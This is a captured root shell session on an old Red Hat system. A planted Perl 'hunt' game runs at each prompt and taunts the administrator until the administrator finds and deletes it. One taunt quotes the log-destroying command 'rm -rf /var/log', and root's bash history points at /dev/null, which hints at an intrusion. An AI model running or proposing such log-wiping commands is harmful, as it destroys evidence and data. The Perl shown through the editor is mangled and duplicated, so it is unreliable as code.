+ Death and life are in the power of the tongue."
+-- Proverbs, some selections from the Jewish Scripture
+
+Didn't you read my banner, or is SUE YOUR ASS unclear?
+
+[root@ariel patch]# ps aux
+USER       PID %CPU %MEM  SIZE   RSS TTY STAT START   TIME COMMAND
+daemon     505  0.0  0.5  1144   296  ?  S   06:45   0:00 /usr/sbin/atd 
+nobody     487  0.0  0.0  1292    44  ?  S   06:45   0:00 (identd)
+nobody     491  0.0  0.0  1292    44  ?  S   06:45   0:00 (identd)
+nobody     492  0.0  0.0  1292    44  ?  S   06:45   0:00 (identd)
+nobody     493  0.0  0.0  1292    44  ?  S   06:45   0:00 (identd)
+nobody     494  0.0  0.0  1292    44  ?  S   06:45   0:00 (identd)
+root         1  0.0  0.0  1120    52  ?  S   06:44   0:05 init [3] 
+root         2  0.0  0.0     0     0  ?  SW  06:44   0:00 (kflushd)
+root         3  0.0  0.0     0     0  ?  SW  06:44   0:02 (kupdate)
+root         4  0.0  0.0     0     0  ?  SW  06:44   0:00 (kpiod)
+root         5  0.0  0.0     0     0  ?  SW  06:44   0:01 (kswapd)
+root         6  0.0  0.0     0     0  ?  SW< 06:44   0:00 (mdrecoveryd)
+root       292  0.0  0.0  1432     0  ?  SW  06:45   0:00 (pump)
+root       361  0.0  0.0     0     0  ?  SW  06:45   0:00 (rpciod)
+root       384  0.0  0.7  1104   388  ?  S   06:45   0:00 /usr/sbin/apmd -p 10 -w 5 -W -s /etc/sysconfig/apm-scripts/suspend -r
+root       411  0.0  0.0  1208    44  ?  S   06:45   0:00 /usr/sbin/automount --timeout 60 /misc file /etc/auto.misc 
+root       464  0.0  0.2  1172   164  ?  S   06:45   0:00 syslogd -m 0 
+root       537  0.0  0.0  1144     0  ?  SW  06:45   0:00 (inetd)
+root       551  0.0  0.0  3460     0  ?  SW  06:45   0:00 (smbd)
+root       560  0.0  0.6  2016   356  ?  S   06:45   0:00 nmbd -D 
+root       622  0.0  0.4  2128   268  ?  S   06:45   0:00 sendmail: accepting connections on port 25 
+root       637  0.0  0.5  1144   316  ?  S   06:45   0:00 gpm -t ps/2 
+root       736  0.0  0.5  1756   284  ?  S   06:46   0:00 /usr/sbin/amd -F /etc/amd.conf 
+root       777  0.0  0.0  1092     0   1 SW  06:46   0:00 (mingetty)
+root       778  0.0  0.0  1092     0   2 SW  06:46   0:00 (mingetty)
+root       779  0.0  0.0  1092    36   3 S   06:46   0:00 /sbin/mingetty tty3 
+root       780  0.0  0.7  1092   408   4 S   06:46   0:00 /sbin/mingetty tty4 
+root       781  0.0  0.7  1092   408   5 S   06:46   0:00 /sbin/mingetty tty5 
+root       782  0.0  0.7  1092   408   6 S   06:46   0:00 /sbin/mingetty tty6 
+root       795  0.0  0.7  1672   388  ?  S   16:06   0:00 login 
+root       967  0.0  0.7   924   400  ?  R   16:24   0:00 ps aux 
+xfs        721  0.0  0.1  3560    60  ?  S   06:45   0:00 xfs -droppriv -daemon -port -1 
+Use of uninitialized value at /usr/games/hunt line 119.
+Use of uninitialized value at /usr/games/hunt line 162.
+
+The last time I saw him he was walking down Lover's Lane holding his own hand.
+		-- Fred Allen
+
+No wonder it took you days to figure out rm -rf /var/log
+
+[root@ariel patch]# who
+Use of uninitialized value at /usr/games/hunt line 119.
+Use of uninitialized value at /usr/games/hunt line 162.
+
+Concerning the war in Vietnam, Senator George Aiken of Vermount noted
+in January, 1966, "I'm not very keen for doves or hawks.  I think we need
+more owls."
+		-- Bill Adler, "The Washington Wits"
+
+No wonder it took you days to figure out rm -rf /var/log
+
+[root@ariel patch]# cd /etc
+Use of uninitialized value at /usr/games/hunt line 119.
+Use of uninitialized value at /usr/games/hunt line 162.
+
+If you ever want to have a lot of fun, I recommend that you go off and program
+an imbedded system.  The salient characteristic of an imbedded system is that
+it cannot be allowed to get into a state from which only direct intervention
+will suffice to remove it.  An imbedded system can't permanently trust anything
+it hears from the outside world.  It must sniff around, adapt, consider, sniff
+around, and adapt again.  I'm not talking about ordinary modular programming
+carefulness here.  No.  Programming an imbedded system calls for undiluted
+raging maniacal paranoia.  For example, our ethernet front ends need to know
+what network number they are on so that they can address and route PUPs
+properly.  How do you find out what your network number is?  Easy, you ask a
+gateway.  Gateways are required by definition to know their correct network
+numbers.  Once you've got your network number, you start using it and before
+you can blink you've got it wired into fifteen different sockets spread all
+over creation.  Now what happens when the panic-stricken operator realizes he
+was running the wrong version of the gateway which was giving out the wrong
+network number?  Never supposed to happen.  Tough.  Supposing that your
+software discovers that the gateway is now giving out a different network
+number than before, what's it supposed to do about it?  This is not discussed
+in the protocol document.  Never supposed to happen.  Tough.  I think you 
+get my drift.
+
+Colder
+
+[root@ariel /etc]# ls
+CORBA		      fdprm		    isapnp.gone		  news			screenrc
+DIR_COLORS	      filesystems	    isdn		  nmh			securetty
+HOSTNAME	      fnrc		    issue		  nscd.conf		security
+MACHINE.SID	      fstab		    issue.net		  nsswitch.conf		sendmail.cf
+Muttrc		      ftpaccess		    issue~		  ntp			sendmail.cw
+TextConfig	      ftpconversions	    krb5.conf		  ntp.conf		sendmail.mc
+X11		      ftpgroups		    ld.so.cache		  nwserv.conf		services
+adjtime		      ftphosts		    ld.so.conf		  nwserv.stations	shadow
+aliases		      ftpusers		    ldap.conf		  openldap		shadow-
+aliases.db	      gated.conf.sample     lilo.conf		  pam.d			shells
+amd.conf	      gettydefs		    lmhosts		  paper.config		skel
+amd.net		      gnome		    localtime		  passwd		slip
+anacrontab	      gpm-root.conf	    login.defs		  passwd-		smb.conf
+at.deny		      group		    logrotate.conf	  passwd.OLD		smbusers
+auto.master	      group-		    logrotate.d		  pbm2ppa.conf		smrsh
+auto.misc	      gshadow		    ltrace.conf		  pcmcia		snmp
+bashrc		      gshadow-		    lvs.cf		  phhttpd.conf		sound
+cdrecord.conf	      gtk		    lynx.cfg		  pine.conf		squid
+codepages	      host.conf		    mail		  pine.conf.fixed	sysconfig
+conf.linuxconf	      host.conf~	    mail.rc		  pnm2ppa.conf		sysctl.conf
+conf.modules	      hosts		    mailcap		  ppp			syslog.conf
+conf.modules~	      hosts.allow	    mailcap.vga		  printcap		termcap
+cron.d		      hosts.deny	    man.config		  profile		up2date.conf
+cron.daily	      hosts~		    mc.global		  profile.d		uucp
+cron.hourly	      httpd		    mesa.conf		  protocols		vga
+cron.monthly	      identd.conf	    mgetty+sendfax	  psdevtab		wgetrc
+cron.weekly	      im_palette-small.pal  midi		  pwdb.conf		yp.conf
+crontab		      im_palette-tiny.pal   mime-magic		  pxe.conf		ypserv.conf
+csh.cshrc	      im_palette.pal	    mime-magic.dat	  rc.d			ytalkrc
+csh.login	      imrc		    mime.types		  redhat-release	zlogin
+default		      inetd.conf	    minicom.users	  resolv.conf		zlogout
+dhcpc		      info-dir		    motd		  rmt			zprofile
+dumpdates	      initlog.conf	    mtab		  rpc			zshenv
+enscript.cfg	      inittab		    mtftpd.conf		  rpm			zshrc
+esd.conf	      inputrc		    mtools.conf		  rpm2html.config
+exports		      ioctl.save	    named.boot		  rpmfind.conf
+fb.modes	      irda		    named.conf		  rpmlint
+Use of uninitialized value at /usr/games/hunt line 119.
+Use of uninitialized value at /usr/games/hunt line 162.
+
+Been Transferred Lately?
+
+Come on, play my game.  cd somewhere and see what happens
+
+[root@ariel /etc]# pico hosts.a deny
+   UW PICO(tm) 3.7                                        New Buffer                                                            ^G Get Help          ^O WriteOut          ^R Read File         ^Y Prev Pg           ^K Cut Text          ^C Cur Pos           ^X Exit              ^J Justify           ^W Where is          ^V Next Pg           ^U UnCut Text        ^T To Spell          [ Reading file ][ Read 9 lines ]File: hosts.deny## hosts.deny    This file describes the names of the hosts which are#               *not* allowed to use the local INET services, as decided#               by the '/usr/sbin/tcpd' server.## The portmap line is redundant, but it is left to remind you that# the new secure portmap uses hosts.deny and hosts.allow.  In particular# you should know that NFS uses portmap!Use of uninitialized value at /usr/games/hunt line 119.
+Use of uninitialized value at /usr/games/hunt line 162.
+
+A man can have two, maybe three love affairs while he's married.  After
+that it's cheating.
+		-- Yves Montand
+
+I bet you think fixing ps will save you
+
+[root@ariel /etc]# ls
+CORBA		      fdprm		    isapnp.gone		  news			screenrc
+DIR_COLORS	      filesystems	    isdn		  nmh			securetty
+HOSTNAME	      fnrc		    issue		  nscd.conf		security
+MACHINE.SID	      fstab		    issue.net		  nsswitch.conf		sendmail.cf
+Muttrc		      ftpaccess		    issue~		  ntp			sendmail.cw
+TextConfig	      ftpconversions	    krb5.conf		  ntp.conf		sendmail.mc
+X11		      ftpgroups		    ld.so.cache		  nwserv.conf		services
+adjtime		      ftphosts		    ld.so.conf		  nwserv.stations	shadow
+aliases		      ftpusers		    ldap.conf		  openldap		shadow-
+aliases.db	      gated.conf.sample     lilo.conf		  pam.d			shells
+amd.conf	      gettydefs		    lmhosts		  paper.config		skel
+amd.net		      gnome		    localtime		  passwd		slip
+anacrontab	      gpm-root.conf	    login.defs		  passwd-		smb.conf
+at.deny		      group		    logrotate.conf	  passwd.OLD		smbusers
+auto.master	      group-		    logrotate.d		  pbm2ppa.conf		smrsh
+auto.misc	      gshadow		    ltrace.conf		  pcmcia		snmp
+bashrc		      gshadow-		    lvs.cf		  phhttpd.conf		sound
+cdrecord.conf	      gtk		    lynx.cfg		  pine.conf		squid
+codepages	      host.conf		    mail		  pine.conf.fixed	sysconfig
+conf.linuxconf	      host.conf~	    mail.rc		  pnm2ppa.conf		sysctl.conf
+conf.modules	      hosts		    mailcap		  ppp			syslog.conf
+conf.modules~	      hosts.allow	    mailcap.vga		  printcap		termcap
+cron.d		      hosts.deny	    man.config		  profile		up2date.conf
+cron.daily	      hosts~		    mc.global		  profile.d		uucp
+cron.hourly	      httpd		    mesa.conf		  protocols		vga
+cron.monthly	      identd.conf	    mgetty+sendfax	  psdevtab		wgetrc
+cron.weekly	      im_palette-small.pal  midi		  pwdb.conf		yp.conf
+crontab		      im_palette-tiny.pal   mime-magic		  pxe.conf		ypserv.conf
+csh.cshrc	      im_palette.pal	    mime-magic.dat	  rc.d			ytalkrc
+csh.login	      imrc		    mime.types		  redhat-release	zlogin
+default		      inetd.conf	    minicom.users	  resolv.conf		zlogout
+dhcpc		      info-dir		    motd		  rmt			zprofile
+dumpdates	      initlog.conf	    mtab		  rpc			zshenv
+enscript.cfg	      inittab		    mtftpd.conf		  rpm			zshrc
+esd.conf	      inputrc		    mtools.conf		  rpm2html.config
+exports		      ioctl.save	    named.boot		  rpmfind.conf
+fb.modes	      irda		    named.conf		  rpmlint
+Use of uninitialized value at /usr/games/hunt line 119.
+Use of uninitialized value at /usr/games/hunt line 162.
+
+Excuse me, but didn't I tell you there's NO HOPE for the survival of
+OFFSET PRINTING?
+
+You are pathetic !!! TYPE CD !!!
+
+[root@ariel /etc]# cd
+Use of uninitialized value at /usr/games/hunt line 119.
+Use of uninitialized value at /usr/games/hunt line 162.
+
+Love -- the last of the serious diseases of childhood.
+
+joe won't help
+
+[root@ariel /etc]# cd 
+Use of uninitialized value at /usr/games/hunt line 119.
+Use of uninitialized value at /usr/games/hunt line 162.
+
+All the passions make us commit faults; love makes us commit the most
+ridiculous ones.
+		-- La Rochefoucauld
+
+Didn't you read my banner, or is SUE YOUR ASS unclear?
+
+[root@ariel /etc]# cd  CD
+login: CD: command not found
+Use of uninitialized value at /usr/games/hunt line 119.
+Use of uninitialized value at /usr/games/hunt line 162.
+
+Brady's First Law of Problem Solving:
+	When confronted by a difficult problem, you can solve it more
+	easily by reducing it to the question, "How would the Lone Ranger
+	have handled this?"
+
+No wonder it took you days to figure out rm -rf /var/log
+
+[root@ariel /etc]# cd /root
+Use of uninitialized value at /usr/games/hunt line 119.
+Use of uninitialized value at /usr/games/hunt line 162.
+
+Q:	How many journalists does it take to screw in a lightbulb?
+A:	Three.  One to report it as an inspired government program to bring
+	light to the people, one to report it as a diabolical government plot
+	to deprive the poor of darkness, and one to win a Pulitzer prize for
+	reporting that Electric Company hired a lightbulb-assassin to break
+	the bulb in the first place.
+
+Here's a hint: ifconfig
+
+[root@ariel /root]# ls
+Use of uninitialized value at /usr/games/hunt line 119.
+Use of uninitialized value at /usr/games/hunt line 162.
+
+Circumstances rule men; men do not rule circumstances.
+		-- Herodotus
+
+You are a dolt; cd for a better life!
+
+[root@ariel /root]# 
+Use of uninitialized value at /usr/games/hunt line 119.
+Use of uninitialized value at /usr/games/hunt line 162.
+
+Never laugh at live dragons.
+		-- Bilbo Baggins [J.R.R. Tolkien, "The Hobbit"]
+
+You are a dolt; cd for a better life!
+
+[root@ariel /root]# ls
+Use of uninitialized value at /usr/games/hunt line 119.
+Use of uninitialized value at /usr/games/hunt line 162.
+
+optimist, n:
+	A bagpiper with a beeper.
+
+cd, stupid, cd!
+
+[root@ariel /root]# ls -al
+total 40
+drwxr-x---   3 root     root         4096 Nov 27 02:09 .
+drwxr-xr-x  21 root     root         4096 Nov 29 16:06 ..
+-rw-------   1 root     noel            0 Nov 19 21:21 .Xauthority
+-rw-r--r--   1 root     root         1126 Aug 23  1995 .Xdefaults
+lrwxrwxrwx   1 root     root            9 Nov 27 02:09 .bash_history -> /dev/null
+-rw-r--r--   1 root     root           24 Jul 14  1994 .bash_logout
+-rw-r--r--   1 root     root          238 Aug 23  1995 .bash_profile
+-rw-r--r--   1 root     root          176 Aug 23  1995 .bashrc
+-rw-r--r--   1 root     root          182 Mar 22  1999 .cshrc
+-rw-rw-r--   1 root     root          133 Nov 27 21:45 .hunt
+-rw-r--r--   1 root     root          166 Mar  4  1996 .tcshrc
+drwx------   2 root     noel         4096 Nov 19 21:17 .xauth
+Use of uninitialized value at /usr/games/hunt line 119.
+Use of uninitialized value at /usr/games/hunt line 162.
+
+They are called computers simply because computation is the only significant
+job that has so far been given to them.
+
+You are pathetic !!! TYPE CD !!!
+
+[root@ariel /root]# /sbin/ifconfig
+eth0      Link encap:Ethernet  HWaddr 00:D0:09:0C:B9:5E  
+          inet addr:10.0.1.5  Bcast:10.255.255.255  Mask:255.0.0.0
+          UP BROADCAST RUNNING  MTU:1500  Metric:1
+          RX packets:6006 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:4060 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:100 
+          Interrupt:3 Base address:0xde00 
+
+lo        Link encap:Local Loopback  
+          inet addr:127.0.0.1  Mask:255.0.0.0
+          UP LOOPBACK RUNNING  MTU:3924  Metric:1
+          RX packets:38 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:38 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:0 
+
+Use of uninitialized value at /usr/games/hunt line 119.
+Use of uninitialized value at /usr/games/hunt line 162.
+
+On the night before her family moved from Kansas to California, the little
+girl knelt by her bed to say her prayers.  "God bless Mommy and Daddy and
+Keith and Kim," she said.  As she began to get up, she quickly added, "Oh,
+and God, this is goodbye.  We're moving to Hollywood."
+
+Didn't you read my banner, or is SUE YOUR ASS unclear?
+
+[root@ariel /root]# cd /usr/games
+Use of uninitialized value at /usr/games/hunt line 119.
+Use of uninitialized value at /usr/games/hunt line 162.
+
+History teaches us that men and nations behave wisely once they have
+exhausted all other alternatives.
+		-- Abba Eban
+
+Way Warmer
+
+[root@ariel games]# ls
+banner	 fortune  hunt	   trojka
+Use of uninitialized value at /usr/games/hunt line 119.
+Use of uninitialized value at /usr/games/hunt line 162.
+
+When you are about to die, a wombat is better than no company at all.
+		-- Roger Zelazny, "Doorways in the Sand"
+
+Didn't you read my banner, or is SUE YOUR ASS unclear?
+
+[root@ariel games]# pico hunt
+   UW PICO(tm) 3.7                                        New Buffer                                                            ^G Get Help          ^O WriteOut          ^R Read File         ^Y Prev Pg           ^K Cut Text          ^C Cur Pos           ^X Exit              ^J Justify           ^W Where is          ^V Next Pg           ^U UnCut Text        ^T To Spell          [ Reading file ][ Read 168 lines ]   File: hunt#! /usr/bin/perl -wuse strict;my(%hunt, $here, $there, $last, $dist, $hunt);my(@welcome) =(sub { "Let the hunt begin!  You are $dist steps away from victory!" },);my(@there) =("You're here! ","Oh my God! It's full of stars!","Welcome to the 9th Gate","Beautiful, isn't it?","Experience the joy of the bugs... just before the Raid.",);my(@same) =("Do you really think I'm not on to you?","joe won't help","Come on, play my game.  cd somewhere and see what happens","You are pathetic !!! TYPE CD !!!","No wonder it took you days to figure out rm -rf /var/log","I bet you think fixing ps will save you","cd, stupid, cd!","I'm a leprechaun, and there's a pot of gold in a directory somewhere","You are a dolt; cd for a better life!","Didn't you read my banner, or is SUE YOUR ASS unclear?","Here's a hint: ifconfig",);my(@warm) =(sub { "Warmer! only $dist steps to go!" },"Warmer! It's just around the corner",sub { ("Way " x ($hunt{last_dist} - $dist)) . "Warmer" },);my(@cold) =    "Do you really think I'm not on to you?","joe won't help",    "Come on, play my game.  cd somewhere and see what happens","You are pathetic !!! TYPE CD !!!",    "No wonder it took you days to figure out rm -rf /var/log","I bet you think fixing ps will save you",    "cd, stupid, cd!","I'm a leprechaun, and there's a pot of gold in a directory somewhere","You are a dolt; cd for a better life!","Didn't you read my banner, or is SUE YOUR ASS unclear?","Here's a hint: ifconfig",    ); my(@warm) =(sub { "Warmer! only $dist steps to go!" },Warmer! It's just around the corner",sub { ("Way " x ($hunt{last_dist} - $dist)) . "Warmer" }, coldColder! The key is in cd",Colder! All that way, and I didn't check the dotfiles",lder! disfile, datfile, dotfile...",Colder",sub { ("Way " x ($dist - $hunt{last_dist})) . "Colder" },  Almost absolute bottom.  Just how dumb are you?",Colder! That won't work",Colder! Almost there and... Ugh",Hey stupid, try 'cd'",);sub find_there {my($there, $i, $s, @l);$i = 10;$there = '/usr';for($i=0; $i<10; $i++) {    unless( opendir(D, "$there") ) {        $there =~ s|(/.+)/.*|$1|;next;        }  Colder! The key is in cd",Colder! All that way, and I didn't check the dotfiles",lder! disfile, datfile, dotfile...",Colder",sub { ("Way " x ($dist - $hunt{last_dist})) . "Colder" },  Almost absolute bottom.  Just how dumb are you?",Colder! That won't work",Colder! Almost there and... Ugh",Hey stupid, try 'cd'",);sub find_there {my($there, $i, $s, @l);$i = 10;$there = '/usr';for($i=0; $i<10; $i++) {    unless( opendir(D, "$there") ) {        $there =~ s|(/.+)/.*|$1|;next;        }      @l = ();    while( $s = readdir(D) ) {        next unless -d "$there/$s";        push(@l, $s);    }    closedir(D);    $s = $l[rand(@l)];    if( $s eq '.' ) {        next;    }    elsif( $s eq '..' ) {$there =~ s|(/.+)/.*|$1|;        }    else {$there .= "/$s";    }   }return $there;}sub init_hunt {  my($hunt) = @_;    while( $s = readdir(D) ) {        next unless -d "$there/$s";        push(@l, $s);    }    closedir(D);    $s = $l[rand(@l)];    if( $s eq '.' ) {        next;    }    elsif( $s eq '..' ) {$there =~ s|(/.+)/.*|$1|;        }    else {$there .= "/$s";    }   }return $there;}sub init_hunt {  my($hunt) = @_;%$hunt =(there => find_there(),start => time(), score => 0, steps => 0, );}sub msg {my($class) = @_;my($x);$x = @$class[rand(@$class)];if( ref($x) ) {    $x = &$x();}    print("\e[1m\e[32m",$x,          "\e[0m",      "\n");   (there => find_there(),start => time(), score => 0, steps => 0, );}sub msg {my($class) = @_;my($x);$x = @$class[rand(@$class)];if( ref($x) ) {    $x = &$x();}    print("\e[1m\e[32m",$x,          "\e[0m",      "\n");   } #---------------------------------------------------------------------my($s, $i, $x, $t, @lh, @lt);use Cwd;  $here = cwd();$i = open(F, "<$ENV{HOME}/.hunt");if( !$i ) {init_hunt(\%hunt);}else {while(<F>) {    $hunt{$1} = $2 if( /(^\w+)=(.*)$/ );}close(F);}   # the distance to the goal is the number of 'cd's up and down required# to get from $here to $there. #---------------------------------------------------------------------my($s, $i, $x, $t, @lh, @lt);use Cwd;  $here = cwd();$i = open(F, "<$ENV{HOME}/.hunt");if( !$i ) {init_hunt(\%hunt);}else {while(<F>) {    $hunt{$1} = $2 if( /(^\w+)=(.*)$/ );}close(F);}   # the distance to the goal is the number of 'cd's up and down required# to get from $here to $there.@lh = split(/\//, $here);@lt = split(/\//, $hunt{there});shift(@lt);shift(@lh);while(@lh && @lt && $lh[0] eq $lt[0]) {    shift(@lt);shift(@lh);}$dist = @lh + @lt;msg(\@welcome);   if( $dist == 0 ) {msg(\@there);init_hunt(\%hunt);} if( defined($hunt{'last_dist'}) ) {    $i = $dist - $hunt{'last_dist'};    $hunt{'score'} += -$i;Use of uninitialized value at /usr/games/hunt line 119.
+Use of uninitialized value at /usr/games/hunt line 162.
+
+Ain't no right way to do a wrong thing.
+		-- The Mad Dogtender
+
+You are pathetic !!! TYPE CD !!!
+
+[root@ariel games]# l s-al
+login: l: command not found
+Use of uninitialized value at /usr/games/hunt line 119.
+Use of uninitialized value at /usr/games/hunt line 162.
+
+Then here's to the City of Boston,
+The town of the cries and the groans.
+Where the Cabots can't see the Kabotschniks,
+And the Lowells won't speak to the Cohns.
+		-- Franklin Pierce Adams
+
+cd, stupid, cd!
+
+[root@ariel games]# ls -al
+total 60
+drwxr-xr-x   2 root     root         4096 Nov 22 08:55 .
+drwxr-xr-x  22 root     root         4096 Oct 21 19:57 ..
+-rwxr-xr-x   1 root     root        16880 Mar  7  2000 banner
+-rwxr-xr-x   1 root     root        11664 Feb  3  2000 fortune
+-rwxr-xr-x   1 root     root         3338 Nov 23 21:47 hunt
+-rwxr-xr-x   1 root     root        14064 Feb  3  2000 trojka
+Use of uninitialized value at /usr/games/hunt line 119.
+Use of uninitialized value at /usr/games/hunt line 162.
+
+There's only one way to have a happy marriage and as soon as I learn
+what it is I'll get married again.
+		-- Clint Eastwood
+
+Do you really think I'm not on to you?
+
+[root@ariel games]# rm hunt
+rm: remove `hunt'? y
+login: /usr/games/hunt: No such file or directory
+
+The real purpose of books is to trap the mind into doing its own thinking.
+		-- Christopher Morley
+
+[root@ariel games]# rm fortune
+rm: remove `fortune'? y
+login: /usr/games/fortune: No such file or directory
+login: /usr/games/hunt: No such file or directory
+
+[root@ariel games]# cat bann
+login: /usr/games/fortune: No such file or directory
+login: /usr/games/hunt: No such file or directory
+
+[root@ariel games]# 
+login: /usr/games/fortune: No such file or directory
+login: /usr/games/hunt: No such file or directory
+
+[root@ariel games]# 
+login: /usr/games/fortune: No such file or directory
+login: /usr/games/hunt: No such file or directory
+
+[root@ariel games]# ls
+banner	trojka
+login: /usr/games/fortune: No such file or directory
+login: /usr/games/hunt: No such file or directory
+
+[root@ariel games]# cd /usr/lib
+login: /usr/games/fortune: No such file or directory
+login: /usr/games/hunt: No such file or directory
+
+[root@ariel lib]# ls
+Mcrt1.o				libgdbm.so			libkspell.so.2.0.0		libstyle.la
+X11				libgdbm.so.2			libkudzu.a			libstyle.so
+anaconda			libgdbm.so.2.0.0		libl.a				libstyle.so.1
+apache				libgdk-1.2.so.0			liblber.a			libstyle.so.1.0.3
+appletsConf.sh			libgdk-1.2.so.0.5.1		liblber.la			libtcl.so
+autofs				libgdk.a			liblber.so			libtcl8.0.so
+bcc				libgdk.la			liblber.so.1			libtclx.so
+bind				libgdk.so			liblber.so.1.0.0		libtclx8.0.4.a
+bison.hairy			libgdk.so.1			libldap.a			libtclx8.0.4.so
+bison.simple			libgdk.so.1.0.6			libldap.la			libtermcap.a
+blt2.4				libgdk_imlib.a			libldap.so			libtermcap.so
+c-client.a			libgdk_imlib.la			libldap.so.1			libthread_db.so
+cappletConf.sh			libgdk_imlib.so			libldap.so.1.0.0		libtiff.a
+cgi-bin				libgdk_imlib.so.1		liblinuxconf.a			libtiff.so
+cracklib_dict.hwm		libgdk_imlib.so.1.9.7		libltdl.a			libtiff.so.3
+cracklib_dict.pwd		libgdkcardimage.a		libltdl.la			libtiff.so.3.5
+cracklib_dict.pwi		libgdkcardimage.la		libltdl.so			libtix.so
+crt1.o				libgdkcardimage.so		libltdl.so.0			libtix4.1.8.0.so
+crti.o				libgdkcardimage.so.0		libltdl.so.0.1.2		libtixsam4.1.8.0.so
+crtn.o				libgdkcardimage.so.0.0.0	libm.a				libtk.so
+cvs				libghttp.a			libm.so				libtk8.0.so
+desktop-links			libghttp.la			libm_p.a			libtkx.so
+docheckgroups			libghttp.so			libmcheck.a			libtkx8.0.4.a
+elm				libghttp.so.1			libmd5.a			libtkx8.0.4.so
+emacs				libghttp.so.1.0.0		libmd5.la			libttf.a
+entity-map			libgif.a			libmd5.so			libttf.la
+exmh-2.1.1			libgif.so			libmd5.so.0			libttf.so
+expect5.28			libgif.so.3			libmd5.so.0.1.0			libttf.so.2
+games				libgif.so.3.1.0			libmediatool.la			libttf.so.2.2.0
+gcc-lib				libgif.so.4			libmediatool.so			libucdagent.a
+gconv				libgif.so.4.1.0			libmediatool.so.2		libucdagent.so
+gcrt1.o				libgimp.a			libmediatool.so.2.0.0		libucdagent.so.0
+getopt				libgimp.la			libmegawidget.a			libucdagent.so.0.4.1.1
+gimp				libgimp.so			libmemintercept.a		libucdmibs.a
+glib				libgimp.so.1			libmemintercept.la		libucdmibs.so
+gnome-libs			libgimp.so.1.0.4		libmemintercept.so		libucdmibs.so.0
+gnome-stones			libgimpui.a			libmenu.a			libucdmibs.so.0.4.1.1
+gnomeConf.sh			libgimpui.la			libmenu.so			libungif.a
+gnumeric			libgimpui.so			libmenu.so.1.9.9e		libungif.la
+gnupg				libgimpui.so.1			libmenu.so.3.0			libungif.so
+groff				libgimpui.so.1.0.4		libmenu.so.4			libungif.so.3
+gtk				libgkb_applet.a			libmenu.so.4.0			libungif.so.3.1.0
+ical				libgkb_applet.la		libmerc.a			libungif.so.4
+innreport_inn.pm		libgkb_applet.so		libmerc.la			libungif.so.4.1.0
+innshellvars			libgkb_applet.so.0		libmerc.so			libutempter.so
+innshellvars.pl			libgkb_applet.so.0.0.0		libmikmod.a			libutempter.so.0
+innshellvars.tcl		libglade-gnome.a		libmikmod.la			libutempter.so.0.5.2
+irc				libglade-gnome.la		libmikmod.so			libutil.a
+isdn				libglade-gnome.so		libmikmod.so.2			libutil.so
+ispell				libglade-gnome.so.0		libmikmod.so.2.0.1		libutil_p.a
+itcl3.0				libglade-gnome.so.0.2.5		libmimelib.la			libuuid.a
+itclConfig.sh			libglade.a			libmimelib.so			libuuid.so
+itk3.0				libglade.la			libmimelib.so.1			libuulib.la
+itkConfig.sh			libglade.so			libmimelib.so.1.0.0		libuulib.so
+iwidgets			libglade.so.0			libmodules.a			libuulib.so.5
+iwidgets2.2.0			libglade.so.0.2.5		libmpi++.a			libuulib.so.5.0.13
+iwidgets3.0.0			libgladeConf.sh			libname-server.a		libversit.a
+jed				libglib-1.2.so.0		libncp.so.2.3			libvga.a
+joe				libglib-1.2.so.0.0.6		libncp.so.2.3.0			libvga.so
+kaffe				libglib.a			libncurses.a			libvga.so.1
+kbd				libglib.la			libncurses.so			libvga.so.1.4.1
+kde2				libglib.so			libncurses.so.1.9.9e		libvgagl.a
+ksirc				libglib.so.1			libncurses.so.3.0		libvgagl.so
+lam				libglib.so.1.0.6		libncurses.so.4			libvgagl.so.1
+ldscripts			libgmodule-1.2.so.0		libncurses.so.4.0		libvgagl.so.1.4.1
+libApiTestOpts.so		libgmodule-1.2.so.0.0.6		libndbm.a			libwrap.a
+libApiTestOpts.so.1.0		libgmodule.a			libndbm.so			libwwwapp.a
+libBLT.a			libgmodule.la			libnewt.a			libwwwapp.la
+libBLT.so			libgmodule.so			libnewt.so			libwwwapp.so
+libBLT.so.2			libgmp.a			libnewt.so.0.50			libwwwapp.so.0
+libBLT.so.2.4			libgmp.so			libnewt.so.0.50.8		libwwwapp.so.0.1.0
+libBrokenLocale.a		libgmp.so.2			libnsl.a			libwwwcache.a
+libBrokenLocale.so		libgmp.so.2.0.2			libnsl.so			libwwwcache.la
+libBrokenLocale_p.a		libgnome.a			libnsl_p.a			libwwwcache.so
+libBstrapOpts.so		libgnome.so			libnss1_compat.so		libwwwcache.so.0
+libBstrapOpts.so.1.0		libgnome.so.32			libnss1_db.so			libwwwcache.so.0.1.0
+libFnlib.a			libgnome.so.32.3.8		libnss1_dns.so			libwwwcore.a
+libFnlib.la			libgnomesupport.a		libnss1_files.so		libwwwcore.la
+libFnlib.so			libgnomesupport.so		libnss1_nis.so			libwwwcore.so
+libFnlib.so.0			libgnomesupport.so.0		libnss_compat.so		libwwwcore.so.0
+libFnlib.so.0.4.0		libgnomesupport.so.0.0.0	libnss_db.so			libwwwcore.so.0.1.0
+libIDL-0.6.so.0			libgnomeui.a			libnss_dns.so			libwwwdir.a
+libIDL-0.6.so.0.4.4		libgnomeui.so			libnss_files.so			libwwwdir.la
+libIDL.a			libgnomeui.so.32		libnss_hesiod.so		libwwwdir.so
+libIDL.so			libgnomeui.so.32.10.3		libnss_nis.so			libwwwdir.so.0
+libIDLConf.sh			libgnorba.a			libnss_nisplus.so		libwwwdir.so.0.1.0
+libIIOP.a			libgnorba.so			libobgnome.a			libwwwfile.a
+libIIOP.so			libgnorba.so.27			libobgnome.la			libwwwfile.la
+libIIOP.so.0			libgnorba.so.27.1.8		libobgnome.so			libwwwfile.so
+libIIOP.so.0.4.0		libgnorbagtk.a			libobgnome.so.0			libwwwfile.so.0
+libImlib.a			libgnorbagtk.so			libobgnome.so.0.0.0		libwwwfile.so.0.1.0
+libImlib.la			libgnorbagtk.so.0		libobgtk.a			libwwwftp.a
+libImlib.so			libgnorbagtk.so.0.0.0		libobgtk.la			libwwwftp.la
+libImlib.so.1			libgpc.a			libobgtk.so			libwwwftp.so
+libImlib.so.1.9.7		libgpm.a			libobgtk.so.1			libwwwftp.so.0
+libORBit.a			libgpm.so			libobgtk.so.1.2.1		libwwwftp.so.0.1.0
+libORBit.so			libgpm.so.1			libopcodes-2.9.5.0.22.so	libwwwgopher.a
+libORBit.so.0			libgpm.so.1.18.0		libopcodes.a			libwwwgopher.la
+libORBit.so.0.4.0		libgrove.a			libopcodes.la			libwwwgopher.so
